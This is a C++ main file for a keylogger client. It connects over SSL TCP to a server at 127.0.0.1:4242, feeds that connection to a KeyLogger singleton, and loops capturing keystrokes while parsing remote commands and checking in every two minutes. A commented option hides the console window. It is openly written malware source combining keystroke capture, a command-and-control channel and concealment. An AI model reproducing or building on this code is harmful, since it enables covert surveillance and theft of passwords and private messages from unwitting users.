#include <iostream>
#include <errno.h>
#include <iostream>
#include <ctime>

#include "KeyLoger.hpp"
#include "Parser.hpp"
#include "SSLTCPClient.hpp"

int main(int argc, char **argv)
{
	SSLTCPClient client;
	Parser	parser(client);
	const int serverCheckDelay = 2*60;
	unsigned long timestamp;
	unsigned long chrono;

	client.connectToHost("127.0.0.1", "4242");
	client.unblockSocket();
	KeyLogger::getInstance().setTCPClient(&client);
	// ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
	timestamp = std::time(nullptr);
	while (KeyLogger::getInstance().refreshNonBlocking())
	{
		parser.parseCommands();
		chrono = std::time(nullptr);
		if (chrono - timestamp >= serverCheckDelay) {
			KeyLogger::getInstance().checkServer();
			chrono = std::time(nullptr);
			timestamp = chrono;
		}
	}
	return 0;
}